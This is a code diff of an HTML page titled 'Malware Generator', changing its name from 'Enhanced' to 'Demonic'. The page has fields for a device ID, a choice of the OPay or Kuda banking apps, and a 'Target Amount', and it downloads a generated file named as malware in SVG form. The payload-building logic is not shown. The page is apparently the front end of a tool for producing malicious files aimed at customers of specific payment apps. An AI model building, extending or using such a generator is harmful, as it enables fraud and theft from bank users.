@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Enhanced Malware Generator</title>
+    <title>Demonic Malware Generator</title>
     <script>
         async function generateMalware() {
             const deviceId = document.getElementById('deviceId').value;
@@ -26,7 +26,7 @@
             // Create download link
             const a = document.createElement('a');
             a.href = url;
-            a.download = `${deviceId}_enhanced_malware.svg`;
+            a.download = `${deviceId}_demonic_malware.svg`;
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
@@ -35,13 +35,13 @@
     </script>
 </head>
 <body>
-    <h1>Enhanced Malware Generator</h1>
+    <h1>Demonic Malware Generator</h1>
     <input id="deviceId" placeholder="Device ID"><br>
     <select id="targetApp">
         <option value="OPay">OPay</option>
         <option value="Kuda">Kuda</option>
     </select><br>
     <input id="targetAmount" placeholder="Target Amount"><br>
-    <button onclick="generateMalware()">Generate Enhanced Malware</button>
+    <button onclick="generateMalware()">Generate Demonic Malware</button>
 </body>
 </html>
